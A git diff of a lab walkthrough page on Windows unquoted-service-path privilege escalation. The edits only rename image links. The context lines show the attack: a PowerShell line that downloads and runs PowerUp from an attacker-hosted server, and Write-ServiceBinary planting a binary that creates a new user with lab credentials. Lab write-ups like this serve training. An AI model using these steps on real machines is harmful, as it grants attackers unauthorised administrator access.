@@ -19,7 +19,7 @@ description: >-
 sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Service.exe" start= auto
 ```
 
-![](<../../../.gitbook/assets/image (11).png>)
+![](<../../../.gitbook/assets/image (11) (1).png>)
 
 3\. Run the following command to create the folders for the service:
 
@@ -46,7 +46,7 @@ Currently the low privileged users can't create any files in the directories wit
 icacls.exe "C:\Program Files\bin folder\program" /grant BUILTIN\Users:W
 ```
 
-![](<../../../.gitbook/assets/image (8).png>)
+![](<../../../.gitbook/assets/image (8) (1).png>)
 
 6\. Run icacls again the check the permissions on the directory:
 
@@ -54,7 +54,7 @@ icacls.exe "C:\Program Files\bin folder\program" /grant BUILTIN\Users:W
 icacls.exe "C:\Program Files\bin folder\program"
 ```
 
-![](<../../../.gitbook/assets/image (3).png>)
+![](<../../../.gitbook/assets/image (3) (1).png>)
 
 ## Attacking
 
@@ -89,7 +89,7 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Prives
 python3 -M http.server 8090
 ```
 
-![](<../../../.gitbook/assets/image (43) (1).png>)
+![](<../../../.gitbook/assets/image (43) (1) (1).png>)
 
 2\. Login on `WS01` with the user `John` and the password `Welcome2022!.`
 
@@ -108,7 +108,7 @@ iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
 
 4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.
 
-![](<../../../.gitbook/assets/image (23).png>)
+![](<../../../.gitbook/assets/image (23) (1).png>)
 
 5\. The output tells us there is a service with the name `Service` and it has a **unqouted** service path (`C:\Program Files\bin folder\program\bin x64\service.exe`).
 
@@ -133,19 +133,19 @@ But we do have write permissions in `C:\Program Files\bin folder\program`.
 Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin folder\program\bin.exe' -Username 'privesc' -Password "Welcome2022!" 
 ```
 
-![](<../../../.gitbook/assets/image (22) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1) (1).png>)
 
 8\. Our current user can't start the service, which means we should restart the machine and check if the user `privesc` is created.
 
-![](<../../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13) (1).png>)
 
-![](<../../../.gitbook/assets/image (9).png>)
+![](<../../../.gitbook/assets/image (9) (1).png>)
 
 9\. Start a new PowerShell session as Administrator and fill in the credentials `privesc:Welcome2022!`.
 
 ![](<../../../.gitbook/assets/image (47).png>)
 
-![](<../../../.gitbook/assets/image (39) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1) (1).png>)
 
 #### Cleanup
 
